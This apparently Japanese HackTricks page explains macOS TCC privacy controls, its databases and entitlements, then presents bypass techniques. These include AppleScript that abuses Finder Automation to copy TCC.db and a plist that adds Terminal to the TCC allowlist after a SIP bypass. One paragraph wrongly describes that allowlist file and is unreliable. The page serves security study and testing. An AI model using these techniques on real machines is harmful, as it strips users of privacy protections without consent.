# macOS TCC

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* あなたは**サイバーセキュリティ企業**で働いていますか？ HackTricksであなたの**会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクション
* [**公式のPEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ハッキングのトリックを共有するために、PRを提出して** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に参加してください。**

</details>

## **基本情報**

**TCC（透明性、同意、および制御）**は、macOSの機構であり、通常はプライバシーの観点から**アプリケーションの特定の機能へのアクセスを制限および制御**します。これには、位置情報サービス、連絡先、写真、マイクロフォン、カメラ、アクセシビリティ、フルディスクアクセスなどが含まれます。

ユーザーの視点からは、TCCが動作しているのは、**TCCによって保護された機能へのアクセスをアプリケーションが要求したとき**です。これが発生すると、**ユーザーにはアクセスを許可するかどうかを尋ねるダイアログが表示**されます。

また、ユーザーが**ファイルにアクセスを許可する**こともできます。たとえば、ユーザーが**ファイルをプログラムにドラッグ＆ドロップする**場合（もちろん、プログラムはそれにアクセスできる必要があります）。

![TCCプロンプトの例](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC**は、`/System/Library/PrivateFrameworks/TCC.framework/Support/tccd`にある**デーモン**によって処理され、`/System/Library/LaunchDaemons/com.apple.tccd.system.plist`で構成されています（`com.apple.tccd.system`というマッハサービスを登録）。

ログインしているユーザーごとに定義された**ユーザーモードのtccd**が`/System/Library/LaunchAgents/com.apple.tccd.plist`に実行され、マッハサービス`com.apple.tccd`と`com.apple.usernotifications.delegate.com.apple.tccd`を登録しています。

ここでは、システムとユーザーとして実行されているtccdを確認できます。
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
アプリケーションの**親から継承される**権限と、**Bundle ID**と**Developer ID**に基づいて**追跡される権限**があります。

### TCCデータベース

選択肢は、システム全体のTCCデータベースである**`/Library/Application Support/com.apple.TCC/TCC.db`**に保存されます。また、ユーザごとの設定の場合は**`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**に保存されます。これらのデータベースは**SIP（System Integrity Protection）によって編集が制限されていますが、読み取ることはできます。

{% hint style="danger" %}
**iOS**のTCCデータベースは**`/private/var/mobile/Library/TCC/TCC.db`**にあります。
{% endhint %}

**`/var/db/locationd/clients.plist`**には、**位置情報サービスにアクセスできるクライアント**が示される、**3番目の**TCCデータベースがあります。

さらに、**フルディスクアクセス**を持つプロセスは、**ユーザモード**のデータベースを編集できます。現在、アプリはデータベースを**読み取るためにFDA**または**`kTCCServiceEndpointSecurityClient`**が必要です（ユーザDBを変更するためにも必要です）。

{% hint style="info" %}
**通知センターUI**は、**システムのTCCデータベース**を変更できます。

{% code overflow="wrap" %}
```bash
codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
[..]
com.apple.private.tcc.manager
com.apple.rootless.storage.TCC
```
{% endcode %}

ただし、ユーザーは**`tccutil`**コマンドラインユーティリティを使用して、ルールを**削除またはクエリ**することができます。
{% endhint %}

{% tabs %}
{% tab title="user DB" %}
{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}

{% tab title="システムDB" %}
{% code overflow="wrap" %}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}
{% endtabs %}

{% hint style="success" %}
アプリが許可された権限、禁止された権限、または持っていない権限（要求される場合があります）を確認するために、両方のデータベースをチェックできます。
{% endhint %}

* **`auth_value`** には、denied(0)、unknown(1)、allowed(2)、またはlimited(3)の異なる値が入る可能性があります。
* **`auth_reason`** には、次の値が入る可能性があります：Error(1)、User Consent(2)、User Set(3)、System Set(4)、Service Policy(5)、MDM Policy(6)、Override Policy(7)、Missing usage string(8)、Prompt Timeout(9)、Preflight Unknown(10)、Entitled(11)、App Type Policy(12)
* テーブルの**他のフィールド**についての詳細は、[**このブログ記事**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)をチェックしてください。

{% hint style="info" %}
一部のTCC権限には、kTCCServiceAppleEvents、kTCCServiceCalendar、kTCCServicePhotosなどがあります。これらをすべて定義する公開リストはありませんが、この[**既知のリスト**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service)をチェックできます。

**Full Disk Access**の名前は**`kTCCServiceSystemPolicyAllFiles`**であり、**`kTCCServiceAppleEvents`**は、一般的に**タスクの自動化**に使用される他のアプリケーションにイベントを送信することを許可します。

**kTCCServiceEndpointSecurityClient**は、TCC権限であり、ユーザーデータベースの書き込みなどの高い特権も付与します。

さらに、**`kTCCServiceSystemPolicySysAdminFiles`**は、ユーザーのホームフォルダを変更する**`NFSHomeDirectory`**属性を変更することができ、それによりTCCを**バイパス**することができます。
{% endhint %}

また、`システム環境設定 --> セキュリティとプライバシー --> プライバシー --> ファイルとフォルダー`で、アプリに与えられた**既存の権限**も確認できます。

{% hint style="success" %}
注意してくださいが、ユーザーがホーム内のデータベースを直接変更することはできません。これはSIPのためです（rootであっても）。新しいルールを設定または変更する唯一の方法は、システム環境設定パネルまたはアプリがユーザーに要求するプロンプトです。

ただし、ユーザーは**`tccutil`**を使用してルールを削除またはクエリすることができます。&#x20;
{% endhint %}

#### リセット
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
### TCC シグネチャのチェック

TCCの**データベース**は、アプリケーションの**バンドルID**を保存していますが、同時に、**許可を使用するために要求するアプリ**が正しいものであることを確認するための**シグネチャに関する情報**も保存しています。

{% code overflow="wrap" %}
```bash
# From sqlite
sqlite> select hex(csreq) from access where client="ru.keepcoder.Telegram";
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
{% endcode %}

{% hint style="warning" %}
したがって、同じ名前とバンドルIDを使用する他のアプリは、他のアプリに付与された許可をアクセスできなくなります。
{% endhint %}

### エンタイトルメント

アプリは、リソースへのアクセスを要求し、許可されたアクセスを持つだけでなく、関連するエンタイトルメントを持つ必要があります。\
たとえば、**Telegram**は、カメラへのアクセスを要求するためのエンタイトルメント`com.apple.security.device.camera`を持っています。このエンタイトルメントを持たないアプリは、カメラにアクセスできません（ユーザーには許可の要求もされません）。

ただし、アプリが`~/Desktop`、`~/Downloads`、`~/Documents`などの特定のユーザーフォルダにアクセスするためには、特定のエンタイトルメントは必要ありません。システムはアクセスを透過的に処理し、必要に応じてユーザーにプロンプトを表示します。

Appleのアプリはプロンプトを生成しません。エンタイトルメントリストに事前に付与された権限が含まれているため、ポップアップは表示されず、TCCデータベースにも表示されません。例えば：
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
これにより、カレンダーがユーザーにリマインダー、カレンダー、アドレス帳へのアクセスを求めることを防ぎます。

{% hint style="success" %}
権限に関する公式ドキュメント以外にも、[https://newosxbook.com/ent.jl](https://newosxbook.com/ent.jl) には非公式ながら興味深い権限に関する情報が見つかることがあります。
{% endhint %}

### 機密情報が保護されていない場所

* $HOME (自体)
* $HOME/.ssh, $HOME/.aws など
* /tmp

### ユーザーの意図 / com.apple.macl

前述のように、ファイルをアプリにドラッグ＆ドロップすることで、そのファイルへのアクセスをアプリに許可することができます。このアクセスはTCCデータベースには特定されず、ファイルの拡張属性として保存されます。この属性には許可されたアプリのUUIDが保存されます。
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
{% hint style="info" %}
興味深いことに、**`com.apple.macl`**属性はtccdではなく**Sandbox**によって管理されています。

また、コンピュータ内のアプリのUUIDを許可するファイルを別のコンピュータに移動すると、同じアプリでも異なるUIDを持つため、そのアプリにアクセス権が付与されません。
{% endhint %}

拡張属性`com.apple.macl`は、他の拡張属性とは異なり、**SIPによって保護されているため、クリアすることはできません**。ただし、[**この投稿で説明されているように**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)、ファイルを**圧縮**し、**削除**してから**解凍**することで無効にすることが可能です。

## TCC特権昇格とバイパス

### AutomationからFDAへの特権昇格

**Finder**は常にFDAを持っているアプリケーションです（UIに表示されない場合でも）、そのため、**Automation**権限を持っている場合、その特権を悪用していくつかのアクションを実行することができます。

{% tabs %}
{% tab title="ユーザーのTCC.dbを盗む" %}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias

try
duplicate file sourceFile to targetFolder with replacing
on error errMsg
display dialog "Error: " & errMsg
end try
end tell
EOD
```
{% tab title="システムのTCC.dbを盗む" %}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias

try
duplicate file sourceFile to targetFolder with replacing
on error errMsg
display dialog "Error: " & errMsg
end try
end tell
EOD
```
{% endtab %}
{% endtabs %}

これを悪用すると、**独自のユーザーTCCデータベースを作成**することができます。

これは、Finderに対して**Automation権限を取得**するためのTCCプロンプトです：

<figure><img src="../../../../.gitbook/assets/image.png" alt="" width="244"><figcaption></figcaption></figure>

### ユーザーTCC DBからFDAへの特権昇格

ユーザーTCCデータベースに**書き込み権限**を取得すると、自分自身に**`FDA`**権限を付与することはできません。FDA権限はシステムデータベースに存在するものだけが付与できます。

しかし、自分自身に**`FinderへのAutomation権限`**を与えることができ、前述の手法を悪用してFDAに特権昇格することができます。

### **FDAからTCC権限への特権昇格**

これは本当の特権昇格ではないと思いますが、念のため役立つかもしれません。FDAを制御できるプログラムがある場合、ユーザーのTCCデータベースを**変更して任意のアクセス権限を与える**ことができます。これは、FDA権限を失った場合の持続性テクニックとして役立つ場合があります。

### **SIPバイパスからTCCバイパスへ**

システムの**TCCデータベース**は**SIP**によって保護されているため、**指定された権限を持つプロセスのみが変更**できます。したがって、攻撃者がSIPに制限された**ファイル**を変更できる**SIPバイパス**を見つけると、TCCデータベースの保護を**解除**し、自身にすべてのTCC権限を与えることができます。

ただし、この**SIPバイパスをTCCバイパスに悪用**する別の方法があります。`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`というファイルは、TCC例外を必要とするアプリケーションの許可リストです。したがって、攻撃者がこのファイルからSIP保護を**解除**し、**独自のアプリケーション**を追加することができれば、そのアプリケーションはTCCをバイパスできます。\
例えば、ターミナルを追加する場合は以下のようにします：
```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```
AllowApplicationsList.plist:

このファイルは、macOSのTCC（トランスペアレントなコンセント制御）フレームワークの一部であり、アプリケーションがユーザーのプライバシーにアクセスするために必要な権限を持っているかどうかを管理します。

このプロパティリスト（.plist）ファイルには、許可されたアプリケーションのリストが含まれており、ユーザーが明示的に許可したアプリケーションのみがプライバシーにアクセスできるようになります。

このファイルを編集することで、特定のアプリケーションに対してTCCフレームワークの制限を追加または削除することができます。ただし、このファイルを編集する前に、十分な知識と注意が必要です。

このファイルは、ユーザーのプライバシーを保護するために重要な役割を果たしており、慎重に管理する必要があります。
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
### TCC バイパス

{% content-ref url="macos-tcc-bypasses/" %}
[macos-tcc-bypasses](macos-tcc-bypasses/)
{% endcontent-ref %}

## 参考文献

* [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
* [**https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command**](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
* [**https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
*   [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ HackTricksであなたの会社を宣伝したいですか？または、PEASSの最新バージョンにアクセスしたいですか、またはHackTricksをPDFでダウンロードしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、私たちの独占的な[NFTs](https://opensea.io/collection/the-peass-family)のコレクション
* [**公式のPEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出してください。**

</details>
